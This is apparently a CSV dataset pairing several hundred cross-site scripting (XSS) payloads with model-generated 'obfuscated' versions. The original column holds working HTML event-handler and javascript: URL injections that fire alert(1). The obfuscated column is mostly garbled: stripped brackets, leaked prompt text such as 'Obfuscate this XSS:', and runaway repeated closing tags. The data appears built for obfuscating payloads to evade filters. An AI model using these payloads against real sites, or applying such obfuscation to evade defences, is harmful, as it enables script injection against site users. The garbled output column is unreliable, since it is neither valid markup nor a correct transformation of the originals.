original,ofuscado
<content onfocusout=alert(1) tabindex=1 id=x></content><input autofocus>,: content onfocusout=alert(1) tabindex=1 id=x>/content>input autofocus>
"<u onkeypress=""alert(1)"" contenteditable>test</u>",test/u>
"<wbr onkeypress=""alert(1)"" contenteditable>test</wbr>","wbr onkeypress=""alert(1)"" contenteditable>test/wbr>"
"<figure oncut=""alert(1)"" contenteditable>test</figure>","figure oncut=""alert(1)"" contenteditable>test/figure>"
<tt onpointerdown=alert(1)>xss</tt>,Opra
"<shadow draggable=""true"" ondragend=""alert(1)"">test</shadow>",": shadow draggable=""true"" ondragend=""alert(1)"">test/shadow>"
"<strong onpaste=""alert(1)"" contenteditable>test</strong>",>Testie/strong>
"<time draggable=""true"" ondragend=""alert(1)"">test</time>",>test/time>
"<menu onmousemove=""alert(1)"">test</menu>",": menu onmousemove=""alert(1)"">test/menu>"
<small onpointerenter=alert(1)>xss</small>,is the most important part of XSS: small onpointerenter=alert(1)>xss/small> XSS: small onpointerenter=alert(1)>xss/small>
<svg onunload=window.open('javascript:alert(1)')>,:=window.open('javascript:alert(1)')>.obfuscate this XSS: svg onunload=window.open('javascript:alert(1)')>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
"<dl draggable=""true"" ondragenter=""alert(1)"">test</dl>","This XSS: dl draggable=""true"" ondragenter=""alert(1)"">test/dl>"
<small id=x tabindex=1 onbeforedeactivate=alert(1)></small><input autofocus>,the XSS: small id=x tabindex=1 onbeforedeactivate=alert(1)>/small>input autofocus>
"<video oncut=""alert(1)"" contenteditable>test</video>","""alert(1)"" contenteditable>test/video>"
"<style>:target {color:red;}</style><span id=x style=""transition:color 1s"" ontransitionend=alert(1)></span>",": style>:target color:red;/style>span id=x style=""transition:color 1s"" ontransitionend=alert(1)>/span>"
"<footer onkeyup=""alert(1)"" contenteditable>test</footer>",": footer onkeyup=""alert(1)"" contenteditable>test/footer>"
<col id=x tabindex=1 onfocus=alert(1)></col>,to this XSS: col id=x tabindex=1 onfocus=alert(1)>/col>
<ruby onpointerdown=alert(1)>xss</ruby>,: ruby onpointerdown=alert(1)>xss/ruby>
"<acronym draggable=""true"" ondragend=""alert(1)"">test</acronym>","this XSS: acronym draggable=""true"" ondragend=""alert(1)"">test/acronym>"
<s onpointerout=alert(1)>xss</s>,: s onpointerout=alert(1)>xss
"<div draggable=""true"" contenteditable>drag me</div><noembed ondrop=alert(1) contenteditable>drop here</noembed>","XSS: div draggable=""true"" contenteditable>drag me/div>noembed ondrop=alert(1) contenteditable>drop here/noembed>"
<rt id=x tabindex=1 onfocusin=alert(1)></rt>,: rt id=x tabindex=1 onfocusin=alert(1)>/rt>
"<sup oncontextmenu=""alert(1)"">test</sup>","ds. XSS: sup oncontextmenu=""alert(1)"">test/sup>test/sup>test/sup>test/sup>test/sup>test/sup> test/sup>test/sup>test?"
"<tr onkeyup=""alert(1)"" contenteditable>test</tr>","csp/tr> the XSS: tr onkeyup=""alert(1)"" contenteditable>test/tr>"
<textarea onpaste=alert(1) autofocus></textarea>,: textarea onpaste=alert(1) autofocus> /textarea>
<br id=x tabindex=1 ondeactivate=alert(1)></br><input id=y autofocus>,x br id=x tabindex=1 ondeactivate=alert(1)>/br>input id=y autofocus>
<table id=x tabindex=1 ondeactivate=alert(1)></table><input id=y autofocus>,x?/table>input id=y autofocus>
"<image oncut=""alert(1)"" contenteditable>test</image>","image oncut=""alert(1)"" contenteditable>test/image>"
<svg><small onload=alert(1)></small>,: svg>small onload=alert(1)>/small>
<spacer onblur=alert(1) tabindex=1 id=x></spacer><input autofocus>,. *Submit autofocus>?
"<noscript onmouseup=""alert(1)"">test</noscript>","or an XSS: noscript onmouseup=""alert(1)"">test/noscript>"
"<footer onmouseout=""alert(1)"">test</footer>","XSS: footer onmouseout=""alert(1)"">test/footer>"
"<style>@keyframes x{}</style><font style=""animation-name:x"" onanimationstart=""alert(1)""></font>","XSS: style>@keyframes x/style>font style=""animation-name:x"" onanimationstart=""alert(1)"">/font>/font>"
"<menu onmouseout=""alert(1)"">test</menu>",": menu onmouseout=""alert(1)"">test/menu>"
<figure onpointerup=alert(1)>xss</figure>,Obfuscate this XSS: figure onpointerup=alert(1)>xss/figure>
"<source onpaste=""alert(1)"" contenteditable>test</source>","=""alert(1)"" contenteditable>test/source>"
<q onpointerover=alert(1)>xss</q>,Obfuscate this XSS: q onpointerover=alert(1)>xss/q>
"<bgsound onmousemove=""alert(1)"">test</bgsound>","bgsound onmousemove=""alert(1)"">test/bgsound>"
"<div draggable=""true"" contenteditable>drag me</div><cite ondrop=alert(1) contenteditable>drop here</cite>",": div draggable=""true"" contenteditable>drag me/div>cite ondrop=alert(1) contenteditable>drop here/cite>"
<address id=x tabindex=1 onbeforedeactivate=alert(1)></address><input autofocus>,re and focus with autofocus>.
"<legend onbeforecut=""alert(1)"" contenteditable>test</legend>","Obfuscate this XSS: legend onbeforecut=""alert(1)"" contenteditable>test/legend>"
"<details onmouseenter=""alert(1)"">test</details>","er=""alert(1)"">test/detail> xSS: details onmouseenter=""alert(1)"">test/detail>>test/detail>"
"<tr oncopy=""alert(1)"" contenteditable>test</tr>",:>test/tr>
<sub id=x tabindex=1 onfocus=alert(1)></sub>,?.:=alert(1)/sub>/sub>.
<frame onpointerenter=alert(1)>xss</frame>,: frame onpointerenter=alert(1)>xss/frame>.
"<style>@keyframes x{}</style><noembed style=""animation-name:x"" onanimationend=""alert(1)""></noembed>",": style>@keyframes x/style>noembed style=""animation-name:x"" onanimationend=""alert(1)"">/noembed>/noembed>/noembed style=""animation-name:x"" onanimationend=""alert(1)"">/noembed> /noembed> /noembed>"
"<pre draggable=""true"" ondragstart=""alert(1)"">test</pre>",", pre draggable=""true"" ondragstart=""alert(1)"">test/pre>"
"<style>:target {color:red;}</style><rp id=x style=""transition:color 1s"" ontransitionend=alert(1)></rp>",", id=x style=""transition:color 1s"" ontransitionend=alert(1)>/rp>"
"<details oncut=""alert(1)"" contenteditable>test</details>","XSS: details oncut=""alert(1)"" contenteditable>test/detail>"
"<thead onbeforecut=""alert(1)"" contenteditable>test</thead>","sthead onbeforecut=""alert(1)"" contenteditable>test/thead>"
"<caption draggable=""true"" ondragleave=""alert(1)"">test</caption>",>test/caption>
"<rtc onkeydown=""alert(1)"" contenteditable>test</rtc>",": rtc onkeydown=""alert(1)"" contenteditable>test/rtc>"
<em id=x tabindex=1 ondeactivate=alert(1)></em><input id=y autofocus>,XSS: em id=x tabindex=1 ondeactivate=alert(1)>/em>input id=y autofocus>
"<?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""> <?import namespace=""t"" implementation=""#default#time2""> <t:set attributename=""innerhtml"" to=""<script defer>alert("""")</script>"">","XSS: ?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""> ?import namespace=""t"" implementation=""#default#time2""> t:set attributename=""innerhtml"" to=""script defer>alert("""")/script>"">"
<strong onpointermove=alert(1)>xss</strong>,: strong onpointermove=alert(1)>xss/strong>.
"<menuitem draggable=""true"" ondragenter=""alert(1)"">test</menuitem>",": menuitem draggable=""true"" ondragenter=""alert(1)"">test/menuitem>"
"<fieldset onmouseout=""alert(1)"">test</fieldset>",> test/fieldset>
<output id=x tabindex=1 onactivate=alert(1)></output>,-output id=x tabindex=1 onactivate=alert(1)>/output>
"<track onmouseout=""alert(1)"">test</track>",": track onmouseout=""alert(1)"">test/track>"
"<hgroup onmouseleave=""alert(1)"">test</hgroup>",>test/hgroup>
"<div draggable=""true"" contenteditable>drag me</div><dl ondragover=alert(1) contenteditable>drop here</dl>","this XSS: div draggable=""true"" contenteditable>drag me/div>dl ondragover=alert(1) contenteditable>drop here/dl>"
<fieldset onpointerenter=alert(1)>xss</fieldset>,: fieldset onpointerenter=alert(1)>xss/fieldset>
"<style>:target {color:red;}</style><font id=x style=""transition:color 1s"" ontransitionend=alert(1)></font>","=x style=""transition:color 1s"" ontransitionend=alert(1)>/font>/font>"
"<button onmouseover=""alert(1)"">test</button>",": button onmouseover=""alert(1)"">test/button>"
"<style draggable=""true"" ondrag=""alert(1)"">test</style>",>test/style>.
<datalist id=x tabindex=1 onfocus=alert(1)></datalist>,: datalist id=x tabindex=1 onfocus=alert(1)>/datalist>
"<style>:target {color: red;}</style><hr id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></hr>","id=x style=""transition:color 10s"" ontransitioncancel=alert(1)>/hr>"
<button onpointerout=alert(1)>xss</button>,: button onpointerout=alert(1)>xss/button>.
"<meter onmouseup=""alert(1)"">test</meter>",": meter onmouseup=""alert(1)"">test/meter>"
"<center onmouseleave=""alert(1)"">test</center>","this XSS: center onmouseleave=""alert(1)"">test/center>"
"<del onbeforecut=""alert(1)"" contenteditable>test</del>","del onbeforecut=""alert(1)"" contenteditable>test/del>"
"<code onpaste=""alert(1)"" contenteditable>test</code>",>test/code>.
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><legend id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></legend>","animation:10s ease-in-out 0s 1x;/style>legend id=x style=""position:absolute;"" onanimationcancel=""alert(1)"">/legend>/legend> /legend>/legend>/legend id=x style=""position:absolute;"" onanimationcancel=""alert(1)"">/legend>/legend>/legen"
"<hr ondblclick=""alert(1)"">test</hr>",id>test/hr>>>test/hr>
document.scripts.length,.scripts.length: document.scripts.length: document.scripts.length: document.scripts.length: document.scripts.length: document.scripts.length is a XSS: document.scripts.length.
"<style>@keyframes x{}</style><b style=""animation-name:x"" onanimationstart=""alert(1)""></b>","/b style=""animation-name:x"" onanimationstart=""alert(1)"">/b>/b>/b>/b>/b>/b>/b> /b>/bin> type>@keyframes x/style>b style=""animation-name:x"" onanimationstart=""alert(1)"">/b>/b>/b>"
"<style>@keyframes x{}</style><span style=""animation-name:x"" onanimationstart=""alert(1)""></span>",":.x"" onanimationstart=""alert(1)"">/span>/span style=""animation-name:x"" onanimationstart=""alert(1)"">/span>/span>/span>/span>/span>/span>/span>/span>/keyframes x/span style=""animation-name:x"" onanimationstart=""alert(1)"">"
"<style>:target {color: red;}</style><samp id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></samp>",""" ontransitioncancel=alert(1)>/samp>"
"<blockquote draggable=""true"" ondragleave=""alert(1)"">test</blockquote>",", ondragleave=""alert(1)"">test/blockquote>"
"<style>:target {color:red;}</style><td id=x style=""transition:color 1s"" ontransitionend=alert(1)></td>",":ml style>:target color:red;/style>td id=x style=""transition:color 1s"" ontransitionend=alert(1)>/td>"
"<div draggable=""true"" contenteditable>drag me</div><blink ondragover=alert(1) contenteditable>drop here</blink>",":div draggable=""true"" contenteditable>drag me/div>blink ondragover=alert(1) contenteditable>drop here/blink>"
"<caption onkeypress=""alert(1)"" contenteditable>test</caption>","caption onkeypress=""alert(1)"" contenteditable>test/caption>"
"<frame onmouseout=""alert(1)"">test</frame>","the XSS: frame onmouseout=""alert(1)"">test/frame>"
"<blockquote draggable=""true"" ondragstart=""alert(1)"">test</blockquote>",": blockquote draggable=""true"" ondragstart=""alert(1)"">test/blockquote>"
<td onpointerenter=alert(1)>xss</td>,Obfuscate this XSS: td onpointerenter=alert(1)>xss/td>
"<body oncopy=""alert(1)"" contenteditable>test</body>","Obfuscate thisXSS: body oncopy=""alert(1)"" contenteditable>test/body>"
<textarea id=x tabindex=1 ondeactivate=alert(1)></textarea><input id=y autofocus>,: textarea id=x tabindex=1 ondeactivate=alert(1)>/textarea>input id=y autofocus>
<hgroup id=x tabindex=1 onfocus=alert(1)></hgroup>,/hgroup>i>/hgroup>Hggroup>>/hgroup>>>>/hgroup>
"<hr onclick=""alert(1)"">test</hr>",": hr onclick=""alert(1)"">test/hr>"
"<style>@keyframes x{}</style><param style=""animation-name:x"" onanimationend=""alert(1)""></param>","/style>param style=""animation-name:x"" onanimationend=""alert(1)"">/param>/param>"
<img srcset=1 onerror=alert(1)>,: img srcset=1 onerror=alert(1)>
"<body onmousedown=""alert(1)"">test</body>","body onmousedown=""alert(1)"">test/body>"
<noscript onpointerenter=alert(1)>xss</noscript>,this XSS: noscript onpointerenter=alert(1)>xss/noscript>
<svg><hr onload=alert(1)></hr>,: svg>hr onload=alert(1)>/hr>
<noembed onpointerover=alert(1)>xss</noembed>,>ed>ss/noembed>. this XSS: noembed onpointerover=alert(1)>xss/noembed>.
<li id=x tabindex=1 onfocus=alert(1)></li>,: id=x tabindex=1 onfocus=alert(1)>/li>
"<image oncopy=""alert(1)"" contenteditable>test</image>","image oncopy=""alert(1)"" contenteditable>test/image>"
"<colgroup onmouseout=""alert(1)"">test</colgroup>","colgroup onmouseout=""alert(1)"">test/colgroup>"
<image onpointerout=alert(1)>xss</image>,?s:image onpointerout=alert(1)>xss/image>.
"<div draggable=""true"" contenteditable>drag me</div><noframes ondragover=alert(1) contenteditable>drop here</noframes>",/noframes ondragover=alert(1) contenteditable>drop here/noframes> and drag here/noframes> contenteditable>drag me/div>noframes ondragover=alert(1) contenteditable>drop here/noframes>/noframes>drop here/noframes>drop here/noframes>drop here/noframes>drop here
"<br onpaste=""alert(1)"" contenteditable>test</br>",": br onpaste=""alert(1)"" contenteditable>test/br>"
"<form draggable=""true"" ondrag=""alert(1)"">test</form>","SS: form draggable=""true"" ondrag=""alert(1)"">test/form>"
<template id=x tabindex=1 onactivate=alert(1)></template>,: XSS: template id=x tabindex=1 onactivate=alert(1)>/template>
"<head draggable=""true"" ondragleave=""alert(1)"">test</head>",": head draggable=""true"" ondragleave=""alert(1)"">test/head>"
"<u onbeforecut=""alert(1)"" contenteditable>test</u>","u onbeforecut=""alert(1)"" contenteditable>test/u>"
"<style>@keyframes slidein {}</style><main style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></main>","a.com. /style>main style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)"">/main>/main>/main>/main>/main style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)"">/"
"<param draggable=""true"" ondrag=""alert(1)"">test</param>","XSS: param draggable=""true"" ondrag=""alert(1)"">test/param>"
<tt id=x tabindex=1 onfocusin=alert(1)></tt>,tt id=x tabindex=1 onfocusin=alert(1)>/tt>
"<ins draggable=""true"" ondragstart=""alert(1)"">test</ins>",s be used as a test test.
"<br draggable=""true"" ondragstart=""alert(1)"">test</br>","xSS: br draggable=""true"" ondragstart=""alert(1)"">test/br>"
<li onpointerenter=alert(1)>xss</li>,the above XSS: li onpointerenter=alert(1)>xss/li>
<del onfocusout=alert(1) tabindex=1 id=x></del><input autofocus>,: del onfocusout=alert(1) tabindex=1 id=x>/del>input autofocus>
"<colgroup onpaste=""alert(1)"" contenteditable>test</colgroup>","=""alert(1)"" contenteditable>test/colgroup>"
"<style>@keyframes x{}</style><input style=""animation-name:x"" onanimationstart=""alert(1)""></input>",":style>@keyframes x/style>input style=""animation-name:x"" onanimationstart=""alert(1)"">/input>/input>/input>/input>/input>/input>/input>/input>/input>/input>/refuse this XSS: style>@keyframes x/style>input"
"<q onkeydown=""alert(1)"" contenteditable>test</q>",": Q onkeydown=""alert(1)"" contenteditable>test/q>"
<svg><sub onload=alert(1)></sub>,this XSS:: svg>sub onload=alert(1)>/sub>
<body onpointerup=alert(1)>xss</body>,: body onpointerup=alert(1)>xss/body>
<q id=x tabindex=1 onbeforeactivate=alert(1)></q>,XSS: q id=x tabindex=1 onbeforeactivate=alert(1)>/q>
<button id=x tabindex=1 onbeforeactivate=alert(1)></button>,> onbeforeactivate=alert(1)>/button>
"<button draggable=""true"" ondragenter=""alert(1)"">test</button>",": button draggable=""true"" ondragenter=""alert(1)"">test/button>"
<strike id=x tabindex=1 ondeactivate=alert(1)></strike><input id=y autofocus>,x tabindex=1 ondeactivate=alert(1)>/strike>input id=y autofocus>
<isindex onpointerenter=alert(1)>xss</isindex>,=alert(1)>xss/isindex>.
"<spacer onmouseup=""alert(1)"">test</spacer>","XSS: spacer onmouseup=""alert(1)"">test/spacer>"
"<bdi onpaste=""alert(1)"" contenteditable>test</bdi>",": bdi onpaste=""alert(1)"" contenteditable>test/bdi>"
<wbr onfocusout=alert(1) tabindex=1 id=x></wbr><input autofocus>,/wbr>input autofocus>
"<div draggable=""true"" contenteditable>drag me</div><strong ondragover=alert(1) contenteditable>drop here</strong>","XSS:div draggable=""true"" contenteditable>drag me/div>strong ondragover=alert(1) contenteditable>drop here/strong>"
"<input oncontextmenu=""alert(1)"">test</input>",": input oncontextmenu=""alert(1)"">test/input>"
"<style>@keyframes x{}</style><video style=""animation-name:x"" onanimationstart=""alert(1)""></video>",":s::.org>/video>/video style=""animation-name:x"" onanimationstart=""alert(1)"">/video>/video>/video>/video>/video>"
"<optgroup onbeforecut=""alert(1)"" contenteditable>test</optgroup>","sdb: optgroup onbeforecut=""alert(1)"" contenteditable>test/optgroup>"
"<content onbeforepaste=""alert(1)"" contenteditable>test</content>",": content onbeforepaste=""alert(1)"" contenteditable>test/content>"
"<style>@keyframes slidein {}</style><header style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></header>",":=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)"">/header>>/header>>>/header>> /header>>>>>>>>>>/header>>>>>>>>>>>>>>>>>>>/header>>>>>>>>>>"
"<picture onmouseup=""alert(1)"">test</picture>",">: picture onmouseup=""alert(1)"">test/picture>"
"<div draggable=""true"" contenteditable>drag me</div><param ondrop=alert(1) contenteditable>drop here</param>","andalert(1) contenteditable>drop here/param>tid>drop here/param> this XSS: div draggable=""true"" contenteditable>drag me/div>param ondrop=alert(1) contenteditable>drop here/param>"
"<s ondblclick=""alert(1)"">test</s>","Obfuscate thisXSS: s ondblclick=""alert(1)"">test"
"<br oncontextmenu=""alert(1)"">test</br>",": br oncontextmenu=""alert(1)"">test/br>"
"<area onkeypress=""alert(1)"" contenteditable>test</area>",""" contenteditable>test/area>"
"<acronym onmouseout=""alert(1)"">test</acronym>","ym onmouseout=""alert(1)"">test/acronym>"
<meter id=x tabindex=1 onfocus=alert(1)></meter>,: meter id=x tabindex=1 onfocus=alert(1)>/meter>
"<menu onkeypress=""alert(1)"" contenteditable>test</menu>",test/menu>
"<basefont draggable=""true"" ondragstart=""alert(1)"">test</basefont>",>test/basefont>
"<html onmouseover=""alert(1)"">test</html>",": html onmouseover=""alert(1)"">test/html>"
"<command onmouseout=""alert(1)"">test</command>",": command onmouseout=""alert(1)"">test/command>"
"<label oncut=""alert(1)"" contenteditable>test</label>","using the following methods: label oncut=""alert(1)"" contenteditable>test/label>"
"<slot ondblclick=""alert(1)"">test</slot>","> slot ondblclick=""alert(1)"">test/slot>"
"<img src=""jav&#x0d;ascript:alert('');"">",":"">... img src=""jav&#x0d;ascript:alert('');""> -img src=""jav&#x0d;ascript:alert('');""> - XSS XSS: img src=""jav&#x0d;ascript:alert('');""> - - - XSS"
"<track draggable=""true"" ondragleave=""alert(1)"">test</track>",":/track>,:>test/track>>. Track draggable=""true"" ondragleave=""alert(1)"">test/track>"
"<style>:target {color: red;}</style><ins id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></ins>","::color 10s"" ontransitioncancel=alert(1)>/ins>"
"<hgroup onkeypress=""alert(1)"" contenteditable>test</hgroup>",” contenteditable>test/hgroup>
<section onblur=alert(1) tabindex=1 id=x></section><input autofocus>,/section>input autofocus> *Subject autofocus>/section>input autofocus>
"<style>@keyframes x{}</style><content style=""animation-name:x"" onanimationend=""alert(1)""></content>",". style>@keyframes x/style>content style=""animation-name:x"" onanimationend=""alert(1)"">/content>/content>/content>/content>/content>/content>>/content>/content>-content>/content>-content>/content>/content>>/content>/content>/content>>/content>/content>/"
"<br draggable=""true"" ondrag=""alert(1)"">test</br>","of your needs, and if you follow the criteria below, XSS should be considered the complete test test."
<custom tags onpointerover=alert(1)>xss</custom tags>,>_custom tags onpointerover=alert(1)>xss/custom tags>.
"<em onkeyup=""alert(1)"" contenteditable>test</em>","ability XSS: em onkeyup=""alert(1)"" contenteditable>test/em>"
"<s draggable=""true"" ondragleave=""alert(1)"">test</s>","Obfuscate this XSS: s draggable=""true"" ondragleave=""alert(1)"">test"
<applet id=x tabindex=1 onactivate=alert(1)></applet>,:: applet id=x tabindex=1 onactivate=alert(1)>/applet>
"<p oncopy=""alert(1)"" contenteditable>test</p>","s: p oncopy=""alert(1)"" contenteditable>test/p>"
<fieldset onpointermove=alert(1)>xss</fieldset>,= fieldset onpointermove=alert(1)>xss/fieldset>
<noembed onpointerup=alert(1)>xss</noembed>,: noembed onpointerup=alert(1)>xss/noembed>
"<kbd ondblclick=""alert(1)"">test</kbd>",": kbd ondblclick=""alert(1)"">test/kbd>"
"<source draggable=""true"" ondragleave=""alert(1)"">test</source>",":: ""source draggable=""true"" ondragleave=""alert(1)"">test/source>"
<caption id=x tabindex=1 onfocusin=alert(1)></caption>,XSS: caption id=x tabindex=1 onfocusin=alert(1)>/caption>
"<aside draggable=""true"" ondragstart=""alert(1)"">test</aside>",": aside draggable=""true"" ondragstart=""alert(1)"">test/aside>"
"<div draggable=""true"" contenteditable>drag me</div><sub ondrop=alert(1) contenteditable>drop here</sub>","at the end of this XSS: div draggable=""true"" contenteditable>drag me/div>sub ondrop=alert(1) contenteditable>drop here/sub>"
"<noscript onmouseenter=""alert(1)"">test</noscript>",".com: noscript onmouseenter=""alert(1)"">test/noscript>"
<video><source onerror=alert(1) src=1></video>,/video>source onerror=alert(1) src=1>/video>
"<caption draggable=""true"" ondrag=""alert(1)"">test</caption>","=""true"" ondrag=""alert(1)"">test/caption>"
<em id=x tabindex=1 onfocusin=alert(1)></em>,the list: em id=x tabindex=1 onfocusin=alert(1)>/em>
"<code draggable=""true"" ondragenter=""alert(1)"">test</code>",": code draggable=""true"" ondragenter=""alert(1)"">test/code>"
<br id=x tabindex=1 onfocusin=alert(1)></br>,br id=x tabindex=1 onfocusin=alert(1)>/br>
<tt id=x tabindex=1 onbeforedeactivate=alert(1)></tt><input autofocus>,/tt>input autofocus>.
"<style>@keyframes slidein {}</style><video style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></video>","/style>video style=""animation-duration:1s;animation-name:slidein;animationiteration-count:2"" onanimationiteration=""alert(1)"">/video>/video>/video>>/video>/video>/video style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)"">/video"
<col onpointerout=alert(1)>xss</col>,the XSS: col onpointerout=alert(1)>xss/col>.
"<style>:target {transform: rotate(180deg);}</style><nobr id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></nobr>","id=x style=""transition:transform 2s"" ontransitionrun=alert(1)>/nobr>/nobr>"
<embed onpointerenter=alert(1)>xss</embed>,XSS: embed onpointerenter=alert(1)>xss/embed>
"<label onkeypress=""alert(1)"" contenteditable>test</label>","that this XSS: label onkeypress=""alert(1)"" contenteditable>test/label>"
<u onpointerover=alert(1)>xss</u>,Obfuscate this XSS: u onpointerover=alert(1)>xss/u>
<object data=/ onload=alert(1)>,: object data=/ onload=alert(1)>
<time onpointerout=alert(1)>xss</time>,Obfuscate this XSS: time onpointerout=alert(1)>xss/time> jD-jD-lrtsfp/time> xlssr_ev=prr.rl>.
onfocus(),this XSS: onfocus()
<dir id=x tabindex=1 onbeforeactivate=alert(1)></dir>,: dir id=x tabindex=1 onbeforeactivate=alert(1)>/dir>
<datalist onpointerover=alert(1)>xss</datalist>,: datalist onpointerover=alert(1)>xss/datalist>.
<col onpointermove=alert(1)>xss</col>,; col onpointermove=alert(1)>xss/col>.
"<frame draggable=""true"" ondrag=""alert(1)"">test</frame>",?/frame>.
"<style onkeypress=""alert(1)"" contenteditable>test</style>",": style onkeypress=""alert(1)"" contenteditable>test/style>"
<font onpointerup=alert(1)>xss</font>,Obfuscate this XSS: font onpointerup=alert(1)>xss/font>
"<style>:target {color:red;}</style><noscript id=x style=""transition:color 1s"" ontransitionend=alert(1)></noscript>","noscript id=x style=""transition:color 1s"" ontransitionend=alert(1)>/noscript>"
"<body onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("""")>",",:;?@[/|]=alert("""")>"
"<datalist oncopy=""alert(1)"" contenteditable>test</datalist>","s:: ‘datalist oncopy=""alert(1)"" contenteditable>test/datalist>"
"<frame onkeydown=""alert(1)"" contenteditable>test</frame>",": frame onkeydown=""alert(1)"" contenteditable>test/frame>"
"<body onpaste=""alert(1)"" contenteditable>test</body>","assualt/body>>;body onpaste=""alert(1)"" contenteditable>test/body>; body onpaste=""alert(1)"" contenteditable>test/body>"
"<center ondblclick=""alert(1)"">test</center>","Obfuscate thisXSS: center ondblclick=""alert(1)"">test/center>"
"<style>:target {color:red;}</style><div id=x style=""transition:color 1s"" ontransitionend=alert(1)></div>","x style=""transition:color 1s"" ontransitionend=alert(1)>/div>"
"<style>@keyframes slidein {}</style><ul style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></ul>","=fug: style>@keyframes slidein: 2"" onanimationiteration=""alert(1)"">/ul>/ul style=""animation-duration:1s;animation-name:slidein;animationiteration-count:2"" onanimationiteration=""alert(1)"">/ul>/ul style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"
"<style>:target {color: red;}</style><nav id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></nav>","is a XSS: style>:target color: red;/style>nav id=x style=""transition:color 10s"" ontransitioncancel=alert(1)>/nav>"
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><caption id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></caption>","animation:10s ease-in-out 0s 1 x;/style>caption id=x style=""position:absolute;"" onanimationcancel=""alert(1)"">/caption>/caption>@keyframes xfromleft:0;to left: 1000px;:target animation:10s ease-in-out 0s 1 x;/style>caption "
<marquee onstart=alert(1)>xss</marquee>,: marquee onstart=alert(1)>xss/marquee>
"<ruby ondblclick=""alert(1)"">test</ruby>","=""alert(1)"">test/ruby>"
<img2 onpointerenter=alert(1)>xss</img2>,onpointerenter=alert(1)>xss/img2>/img2>?
"<br onkeydown=""alert(1)"" contenteditable>test</br>",/br>?
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><option id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></option>","?=""position:absolute;"" onanimationcancel=""alert(1)"">/option>option>:target animation:10s ease-in-out 0s 1 x;/style>option id=x style=""position:absolute;"" onanimationcancel=""alert(1)"">/option>/option>/option>te>option>obfuscate this XSS: "
<script id=x tabindex=1 onbeforedeactivate=alert(1)></script><input autofocus>,: script id=x tabindex=1 onbeforedeactivate=alert(1)>/script>input autofocus>.
<img onpointerup=alert(1)>xss</img>,XSS: img onpointerup=alert(1)>xss/img>
<ins onpointerup=alert(1)>xss</ins>,this XSS: ins onpointerup=alert(1)>xss/ins>
<svg><animate onend=alert(1) attributename=x dur=1s>,: svg>animate onend=alert(1) attributename=x dur=1s>>
"<embed onkeypress=""alert(1)"" contenteditable>test</embed>",>test/embed>
<center id=x tabindex=1 onactivate=alert(1)></center>,center id=x tabindex=1 onactivate=alert(1)>/center>
"<legend onbeforecopy=""alert(1)"" contenteditable>test</legend>",>test/legend>
"<tfoot onmousedown=""alert(1)"">test</tfoot>",": tfoot onmousedown=""alert(1)"">test/tfoot>"
<td id=x tabindex=1 onfocusin=alert(1)></td>,td id=x tabindex=1 onfocusin=alert(1)>/td>
<script x> alert(1) </script 1=2,: script x> alert(1) /script 1=2
